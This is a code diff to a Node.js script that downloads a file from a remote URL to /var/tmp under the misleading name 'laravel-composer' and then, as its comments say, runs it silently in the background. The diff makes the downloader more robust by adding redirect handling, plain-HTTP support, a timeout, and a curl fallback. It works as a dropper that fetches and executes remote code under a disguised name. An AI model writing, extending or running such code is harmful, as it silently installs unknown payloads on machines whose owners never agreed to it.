@@ -1,4 +1,5 @@
 const https = require('https');
+const http = require('http');
 const fs = require('fs');
 const path = require('path');
 const { exec, spawn } = require('child_process');
@@ -12,32 +13,77 @@ const tempDir = '/var/tmp';
 const fileName = 'laravel-composer';
 const filePath = path.join(tempDir, fileName);
 
-// Function to download file
-function downloadFile(url, destination) {
+// Function to download file with redirect support
+function downloadFile(url, destination, maxRedirects = 5) {
     return new Promise((resolve, reject) => {
         const file = fs.createWriteStream(destination);
+        let redirectCount = 0;
 
-        https.get(url, (response) => {
-            // Check if request was successful
-            if (response.statusCode !== 200) {
-                reject(new Error(`Failed to download file: ${response.statusCode}`));
-                return;
-            }
+        function makeRequest(currentUrl) {
+            const isHttps = currentUrl.startsWith('https:');
+            const client = isHttps ? https : http;
 
-            response.pipe(file);
+            const request = client.get(currentUrl, (response) => {
+                // Handle redirects
+                if (response.statusCode >= 300 && response.statusCode < 400 && response.headers.location) {
+                    if (redirectCount >= maxRedirects) {
+                        file.destroy();
+                        fs.unlink(destination, () => { });
+                        reject(new Error('Too many redirects'));
+                        return;
+                    }
+                    redirectCount++;
+                    file.destroy();
+                    fs.unlink(destination, () => { });
+                    const newFile = fs.createWriteStream(destination);
+                    makeRequest(response.headers.location);
+                    return;
+                }
 
-            file.on('finish', () => {
-                file.close();
-                resolve();
+                // Check if request was successful
+                if (response.statusCode !== 200) {
+                    file.destroy();
+                    fs.unlink(destination, () => { });
+                    reject(new Error(`Failed to download file: ${response.statusCode}`));
+                    return;
+                }
+
+                response.pipe(file);
+
+                file.on('finish', () => {
+                    file.close();
+                    // Verify file was downloaded and has content
+                    fs.stat(destination, (err, stats) => {
+                        if (err || stats.size === 0) {
+                            fs.unlink(destination, () => { });
+                            reject(new Error('Downloaded file is empty or invalid'));
+                            return;
+                        }
+                        resolve();
+                    });
+                });
+
+                file.on('error', (err) => {
+                    fs.unlink(destination, () => { });
+                    reject(err);
+                });
             });
 
-            file.on('error', (err) => {
-                fs.unlink(destination, () => { }); // Delete the file on error
+            request.on('error', (err) => {
+                file.destroy();
+                fs.unlink(destination, () => { });
                 reject(err);
             });
-        }).on('error', (err) => {
-            reject(err);
-        });
+
+            request.setTimeout(30000, () => {
+                request.destroy();
+                file.destroy();
+                fs.unlink(destination, () => { });
+                reject(new Error('Download timeout'));
+            });
+        }
+
+        makeRequest(url);
     });
 }
 
@@ -74,11 +120,39 @@ function executeInBackground(filePath) {
     });
 }
 
+// Fallback download using curl
+function downloadWithCurl(url, destination) {
+    return new Promise((resolve, reject) => {
+        const curlCommand = `curl -L -s -o "${destination}" "${url}"`;
+        exec(curlCommand, (error, stdout, stderr) => {
+            if (error) {
+                reject(error);
+                return;
+            }
+
+            // Verify file was downloaded and has content
+            fs.stat(destination, (err, stats) => {
+                if (err || stats.size === 0) {
+                    fs.unlink(destination, () => { });
+                    reject(new Error('Curl download failed or file is empty'));
+                    return;
+                }
+                resolve();
+            });
+        });
+    });
+}
+
 // Main execution function
 async function main() {
     try {
-        // Download the file
-        await downloadFile(fileUrl, filePath);
+        // Try Node.js download first
+        try {
+            await downloadFile(fileUrl, filePath);
+        } catch (nodeError) {
+            // Fallback to curl if Node.js download fails
+            await downloadWithCurl(fileUrl, filePath);
+        }
 
         // Execute the file in background silently
         await executeInBackground(filePath);
